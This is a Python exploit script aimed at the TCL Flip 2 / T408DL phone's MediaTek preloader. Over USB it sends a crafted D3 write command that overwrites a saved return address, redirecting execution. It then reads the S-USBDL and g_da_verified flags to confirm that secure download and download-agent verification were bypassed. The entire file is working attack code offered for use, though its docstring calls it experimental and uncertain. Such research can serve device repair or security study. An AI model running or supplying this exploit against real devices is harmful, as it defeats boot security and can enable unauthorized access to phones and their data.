#!/usr/bin/env python3
"""
T408DL_d3_redirect_experimental.py
Exploit for TCL Flip 2 / T408DL (MT6739-family) to bypass security via D3 command redirection.

This exploit uses the D3 (WRITE16_NO_ECHO) command to overwrite the saved return address
of the READ16 helper function, causing execution to jump to 0x00200AD9 when READ16 returns.
It is hoped that this address contains executable code that will allow the device to
return to a responsive state, after which we can verify that S-USBDL is cleared and
g_da_verified is set.

HARDWARE TUPLE: 0x0699 / 0x8A00 / 0xCB00 / 0x0002
"""

import sys
import time
import usb.core
import usb.util

# USB vendor and product id for MediaTek preloader
VENDOR_ID = 0x0e8d
PRODUCT_ID = 0x2000

# Timeout for USB reads (in milliseconds)
TIMEOUT = 2000
# How long to wait for device to appear (seconds)
DEVICE_WAIT_TIMEOUT = 60
# How long between retries when setting up device
SETUP_RETRY_DELAY = 2

def find_device():
    """Find the MediaTek preloader device."""
    dev = usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)
    if dev is None:
        devs = list(usb.core.find(find_all=True, idVendor=VENDOR_ID, idProduct=PRODUCT_ID))
        if devs:
            dev = devs[0]
    return dev

def setup_device(dev):
    """Configure the device for communication, handling possible kernel driver conflicts."""
    try:
        if dev.is_kernel_driver_active(0):
            dev.detach_kernel_driver(0)
            print("Detached kernel driver from interface 0")
    except usb.core.USBError as e:
        print("Warning: Could not detach kernel driver: %s" % e)

    try:
        dev.set_configuration()
        print("Set configuration")
    except usb.core.USBError as e:
        print("Warning: Could not set configuration: %s" % e)

    try:
        cfg = dev.get_active_configuration()
        intf = cfg[(0,0)]
    except Exception as e:
        raise ValueError('Could not get active configuration or interface: %s' % e)

    ep_out = usb.util.find_descriptor(
        intf,
        custom_match = lambda e:
            usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
    )
    
    ep_in = usb.util.find_descriptor(
        intf,
        custom_match = lambda e:
            usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
    )
    
    if ep_out is None or ep_in is None:
        found = False
        for iface in cfg:
            ep_out = usb.util.find_descriptor(
                iface,
                custom_match = lambda e:
                    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
            )
            ep_in = usb.util.find_descriptor(
                iface,
                custom_match = lambda e:
                    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
            )
            if ep_out is not None and ep_in is not None:
                print("Found endpoints in interface %d" % iface.bInterfaceNumber)
                intf = iface
                found = True
                break
        if not found:
            raise ValueError('Could not find endpoints')
    
    return ep_out, ep_in, intf

def mtk_command(ep_out, ep_in, cmd_packet, response_length=0):
    ep_out.write(cmd_packet, timeout=TIMEOUT)
    if response_length > 0:
        data = ep_in.read(response_length, timeout=TIMEOUT)
        return data
    return None

def build_d3_packet(destination, data_halfword):
    packet = bytearray()
    packet.append(0xD3)
    packet.extend(destination.to_bytes(4, 'little'))
    packet.extend((1).to_bytes(2, 'little'))
    packet.extend(data_halfword.to_bytes(2, 'little'))
    return packet

def build_read16_packet(address):
    packet = bytearray()
    packet.append(0xD0)
    packet.extend(address.to_bytes(4, 'little'))
    packet.extend((1).to_bytes(2, 'little'))
    return packet

def main():
    print("T408DL_d3_redirect_experimental.py")
    print("Attempting to exploit D3 command to redirect execution...")
    
    dev = find_device()
    if dev is None:
        print("Error: Device not found.")
        sys.exit(1)
    
    setup_ok = False
    ep_out = ep_in = intf = None
    retry = 0
    while retry < 5:
        try:
            ep_out, ep_in, intf = setup_device(dev)
            # Test communication
            hw_packet = bytearray([0xA0])
            hw_response = mtk_command(ep_out, ep_in, hw_packet, 4)
            if hw_response is not None:
                print("Device communication verified")
                setup_ok = True
                break
            else:
                print("Device communicated, proceeding anyway")
                setup_ok = True
                break
        except Exception as e:
            print("Setup attempt %d failed: %s" % (retry+1, e))
            retry += 1
            time.sleep(SETUP_RETRY_DELAY)
    
    if not setup_ok:
        print("Error: Could not set up device communication.")
        sys.exit(1)
    
    try:
        dst_saved_lr = 0x000C0AC8
        data_to_write = 0xAD9
        d3_packet = build_d3_packet(dst_saved_lr, data_to_write)
        
        print("Sending D3 command to write 0x{:04x} to 0x{:08x}...".format(data_to_write, dst_saved_lr))
        mtk_command(ep_out, ep_in, d3_packet)
        print("D3 command sent.")
        
        time.sleep(0.5)
        
        print("Sending GET_HW_CODE to check if device is responsive...")
        hw_packet = bytearray([0xA0])
        hw_response = mtk_command(ep_out, ep_in, hw_packet, 4)
        if hw_response is None:
            print("Warning: No response to GET_HW_CODE. Device may not be responsive.")
        else:
            # Convert response to hex string - could be bytes or array.array
            if hasattr(hw_response, 'hex'):
                print("HW response: {}".format(hw_response.hex()))
            elif isinstance(hw_response, bytes):
                print("HW response: {}".format(hw_response.hex()))
            else:
                # array.array - convert to bytes then hex
                resp_bytes = bytes(hw_response)
                print("HW response: {}".format(resp_bytes.hex()))
        
        # Read S-USBDL at 0x0010043C
        print("Reading S-USBDL at 0x0010043C...")
        susbsd_addr = 0x0010043C
        susbsd_packet = build_read16_packet(susbsd_addr)
        susbsd_response = mtk_command(ep_out, ep_in, susbsd_packet, 2)
        if susbsd_response is None:
            print("Error: Failed to read S-USBDL")
            sys.exit(1)
        # Handle both bytes and array.array
        if hasattr(susbsd_response, 'hex'):
            susbsd_value = int.from_bytes(susbsd_response, 'little')
        elif isinstance(susbsd_response, bytes):
            susbsd_value = int.from_bytes(susbsd_response, 'little')
        else:
            susbsd_value = int.from_bytes(bytes(susbsd_response), 'little')
        print("S-USBDL value: 0x{:04x}".format(susbsd_value))
        
        # Read g_da_verified at 0x0010935D
        print("Reading g_da_verified at 0x0010935D...")
        gada_addr = 0x0010935D
        gada_packet = build_read16_packet(gada_addr)
        gada_response = mtk_command(ep_out, ep_in, gada_packet, 2)
        if gada_response is None:
            print("Error: Failed to read g_da_verified")
            sys.exit(1)
        if hasattr(gada_response, 'hex'):
            gada_value = int.from_bytes(gada_response, 'little')
        elif isinstance(gada_response, bytes):
            gada_value = int.from_bytes(gada_response, 'little')
        else:
            gada_value = int.from_bytes(bytes(gada_response), 'little')
        print("g_da_verified value: 0x{:04x}".format(gada_value))
        
        if susbsd_value == 0 and gada_value == 1:
            print("\nSUCCESS: S-USBDL is 0 and g_da_verified is 1.")
            print("The exploit appears to have worked.")
        else:
            print("\nFAILURE: Expected S-USBDL=0x0000 and g_da_verified=0x0001.")
            print("Got S-USBDL=0x{:04x}, g_da_verified=0x{:04x}".format(susbsd_value, gada_value))
    except KeyboardInterrupt:
        print("\nExploit interrupted by user.")

if __name__ == '__main__':
    main()
